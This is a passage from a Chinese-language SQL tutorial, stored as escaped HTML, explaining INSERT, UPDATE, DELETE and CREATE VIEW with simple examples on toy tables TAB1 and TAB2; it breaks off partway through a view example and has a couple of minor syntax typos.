&lt;p&gt;&lt;mark&gt;&lt;strong&gt;VALUES(常量1,常量n);&lt;/strong&gt;&lt;/mark&gt;    //字符串常量要用单引号&amp;rsquo;&amp;lsquo;括起来&lt;/p&gt;
&lt;h4 id=&#34;假设现在有tab1表有c1到c4四列其中c4列是字符串常量&#34;&gt;&lt;span style=&#34;font-size:20px;color:red&#34;&gt;&lt;strong&gt;假设现在有TAB1表，有C1到C4四列，其中C4列是字符串常量：&lt;/strong&gt;&lt;/span&gt;
&lt;/h4&gt;&lt;h4 id=&#34;情况1明确给出新增元组要在哪些属性上赋值插入数据包含全部属性列&#34;&gt;情况1：明确给出新增元组要在哪些属性上赋值（插入数据包含全部属性列）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况2明确给出新增元组要在哪些属性上赋值插入数据只包含部分属性列&#34;&gt;情况2：明确给出新增元组要在哪些属性上赋值（插入数据只包含部分属性列）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这种情况下C4列会被赋值NULL，如果C4有约束条件NOT NULL则会报错&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况3仅指出要在tab1表上插入元组插入数据包含全部属性列&#34;&gt;情况3：仅指出要在TAB1表上插入元组（插入数据包含全部属性列）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这种情况表示要在全部属性列上赋值，插入数据顺序必须和列的顺序对应&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况4仅指出要在tab1表上插入元组插入数据只包含部分属性列&#34;&gt;情况4：仅指出要在TAB1表上插入元组（插入数据只包含部分属性列）
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;VALUES&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#c678dd&#34;&gt;NULL&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这种情况必须明确未赋值的属性列为NULL&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;插入子查询结果&#34;&gt;插入子查询结果
&lt;/h3&gt;&lt;h4 id=&#34;一般格式-2&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;INSERT&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;INTO TAB1(属性列1,属性列2)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;子查询;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg.假设现有TAB1表（如上），并按C1列分组求C2列的平均值，并存入TAB2表（其中TAB2表的C1列存放
C1，avg_C2列存放C2列的均值)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INSERT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;INTO&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;avg_C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;, &lt;span style=&#34;color:#c678dd&#34;&gt;AVG&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;FROMTAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;GROUP&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;BY&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;修改数据update语句&#34;&gt;修改数据&amp;ndash;UPDATE语句
&lt;/h2&gt;&lt;h4 id=&#34;一般格式-3&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;UPDATE 表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;==&lt;strong&gt;SET 列名1=表达式1,列名n=表达式n&lt;/strong&gt;&lt;mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;/mark&gt;&lt;strong&gt;WHERE 条件;&lt;/strong&gt;==&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WHERE语句若省略，则表示修改表中所有元组&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况1修改某一个元组的值&#34;&gt;情况1：修改某一个元组的值
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况2修改多个元组的值&#34;&gt;情况2：修改多个元组的值
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况3带子查询的修改语句&#34;&gt;情况3：带子查询的修改语句
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;UPDATE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SET&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;avg_C2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;删除语句delete语句&#34;&gt;删除语句&amp;ndash;DELETE语句
&lt;/h2&gt;&lt;h4 id=&#34;一般格式-4&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DELETE&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;FROM 表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WHERE 条件;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WHERE语句若省略，则表示删除表中所有元组&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况1删除某一个元组的值&#34;&gt;情况1：删除某一个元组的值
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELETE&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况2修改多个元组的值-1&#34;&gt;情况2：修改多个元组的值
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELETE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况3带子查询的修改语句-1&#34;&gt;情况3：带子查询的修改语句
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;DELETE&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;IN&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	(&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;avg_C2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    );
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;view-视图&#34;&gt;VIEW 视图
&lt;/h2&gt;&lt;h3 id=&#34;建立视图&#34;&gt;建立视图
&lt;/h3&gt;&lt;h4 id=&#34;一般格式-5&#34;&gt;一般格式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE VIEW 视图名 (列名1,列名n)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;AS 子查询&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;WITH CHECK OPTION;&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;若省略视图名后的列名，则该视图由子查询中SELECT的目标列字段组成&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;若添加WITH句，则表示对视图进行增删改时要满足子查询中的条件表达式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:RED&#34;&gt;在以下情况中必须明确指定组成视图的列名：&lt;/span&gt;&lt;/strong&gt;
&lt;strong&gt;1.某个目标列不是单纯的列名，而是聚集函数或列表达式&lt;/strong&gt;
&lt;strong&gt;2.多表连接时选出了几个同名列作为视图的字段&lt;/strong&gt;
&lt;strong&gt;3.需要在视图中为某个列启用新的更合适的名字&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span style=&#34;color:orange&#34;&gt;行列子集视图&lt;/span&gt;：由单个基本表导出，仅去掉了基本表的某些行和某些列，但保留了主码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;若某些视图是建立在另一个表的全部属性列上的（视图与基本表的各列是一一对应的）那么当修改基本表的结构时，基本表和视图的映像关系会被破坏。这种情况最好在修改基本表后删除该视图，然后重建该视图&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;情况1建立完全视图&#34;&gt;情况1：建立完全视图
&lt;/h4&gt;&lt;p&gt;eg1.建立C1为1时TAB1的视图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况2建立带有增删改条件的视图&#34;&gt;情况2：建立带有增删改条件的视图
&lt;/h4&gt;&lt;p&gt;eg2.建立C4为4时TAB1的视图，并且以后每次增删改时都要满足C4=4&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;TAB1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C4&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;WITH&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;CHECK&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;OPTION&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;情况3由视图新建视图&#34;&gt;情况3：由视图新建视图
&lt;/h4&gt;&lt;p&gt;eg3.建立在一个或多个已定义的视图上&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;VIEW&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;V_TAB3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;AS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;C1&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C2&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;C3&lt;/span&gt;
